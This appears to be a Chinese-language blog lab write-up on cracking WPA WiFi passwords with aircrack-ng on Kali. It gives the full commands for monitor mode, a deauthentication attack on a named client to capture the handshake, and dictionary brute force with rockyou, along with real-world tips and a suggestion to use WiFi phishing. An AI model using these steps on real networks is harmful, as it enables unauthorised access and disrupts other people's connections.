## 试验环境：

> 台式机
> 
> Kali虚拟机
> 
> 无线网卡

## 试验过程：

### 一、无线网卡安排

1.  主机USB接口直接怼入无线网卡，Kali虚拟机弹窗提示，选择连接到虚拟机，选中Kali，点击确定。（看到有些教程说需要安装驱动，这可能跟所购买的无线网卡是否免驱有关，我这里是免驱版的，直接怼入即可使用。）
    
    ![](../Images/80d2b7de7b4731325533e31708c3e9ca.png)
    
2.  此时在Kali的网络连接处就可以看到，虚拟机可以搜索到附近的WIFI。说明网卡怼入成功。
    
      
    
    ![](../Images/76daa9519abd71338aaeb0e808973e9e.png)
    
3.  .打开终端输入ifconfig查看网卡，存在wlan0。也说明网卡怼入成功。
    

![](../Images/dafe23683c49c5971b0e9fbd6af67e78.png)

二、握手包抓取  

1、输入命令，清除系统中可能影响监听的进程：

```
airmon-ng check kall
```

2、开启网卡监听：

```
airmon-ng start wlan0
```

![](../Images/d4a718957657f8b6c049e958219fb254.png)

3、检查是否成功开启监听：

（可以看到wlan0变成了wlan0mon，说明成功开启监听模式）

```
iwconfig
```

![](../Images/360a12b0ff47e75804ef39a4cfa31d87.png)

4、开始探测附近的WIFI：

```

airodump-ng wlan0mon
```

主要看三个参数：

> BSSID：路由器的MAC地址
> 
> PWR：信号值，绝对值越低，说明信号越强
> 
> CH：当前路由器使用的信道

![](../Images/32ceef4d94d6c4a54dee5dbbec3a652e.png)

5、找一个信号比较强的WIFI进行监听，这里选择了一个实验的wifi，BSSID为：42:FC:C6:47:E9:34，使用的信道为6，输入命令，开始监听：

```

airodump-ng --bssid 42:FC:C6:47:E9:34 -c 6 -w test wlan0mon
```

（下图说明：BSSID为路由器MAC地址，STATION为当前连接在路由器上的设备的MAC地址）

![](../Images/ed602c2484292d05c3ad4e0a0d6848b7.png)

参数说明：

> –bssid：路由器的MAC地址
> 
> \-c：路由器使用的信道
> 
> \-w：抓取的握手包名称，可以选择输出的路径，这里使用默认输出路径为根目录

6、另外再打开一个终端，对当前正在连接的某个设备进行攻击，使其断开与路由器的连接。（原理没有深究，大概使向目标发送大量数据，或者类似于ARP欺骗的攻击，使设备与路由器断开连接，停止攻击后，设备会自动连接上路由器，此时就可以抓取到握手包。）

```
aireplay-ng -0 20 -a 42:FC:C6:47:E9:34  -c 92:F8:EC:42:34:F1 wlan0mon（测试时用的这个命令）或者 aireplay-ng --deauth 20 -a42:FC:C6:47:E9:34 -c 92:F8:EC:42:34:F1 wlan0mon（听说这个命令也可以，但是在测试的适合报错了）
```

![](../Images/5d7696deefe0a8f6153113db03d29dd3.png)

参数说明：

> \-0、–deauth：指定对目标进行攻击的次数
> 
> \-a：路由器的MAC地址
> 
> \-c：目标MAC地址
> 
> 这个是向连接路由器的这个被攻击机发送大量数据导致被攻击机wifi断开，等待客户机重连wifi截获握手包

7、等待攻击完成，此时在第一个终端会显示握手包抓取成功，如下图：

![](../Images/3211a2f4609670b7b016661037cd6b7f.png)

8、在根目录生成有一些握手包文件，其中包含test-01.cap

![](../Images/3bfe573d87d9d6ddf7c72499e50139c9.png)

### 三、爆破开启

1.在终端输入命令：

```
aircrack-ng  -w pass.txt test-01.cap
```

参数说明：

> \-w：指定一个密码文件

## 

![](../Images/58e4312cc6ee0389107b6de2eed0b9fb.png)

    这里因为是做实验，所以就直接将密码写进了字典进行爆破，实战中可以将字典换成kali自带的字典进行爆破

kali自带的字典文件路径：/usr/share/wordlists/rockyou.txt.gz（要先进行解压）

## 个人总结：

感觉就是学习了一个工具的大概使用过程，aircrack-ng原理是使用CPU去跑包，全程不需要联网，破解速度看个人CPU的性能。  
暴力破解并不简单，需要足够强大的字典和时间，可以通过字典生成工具生成自己的字典，字典越强大越容易破解。。哈哈，也是需要点运气的！

（PS：穷举爆破这种事，关键还是字典和目标密码强度，不是很推荐，建议使用wifi钓鱼）
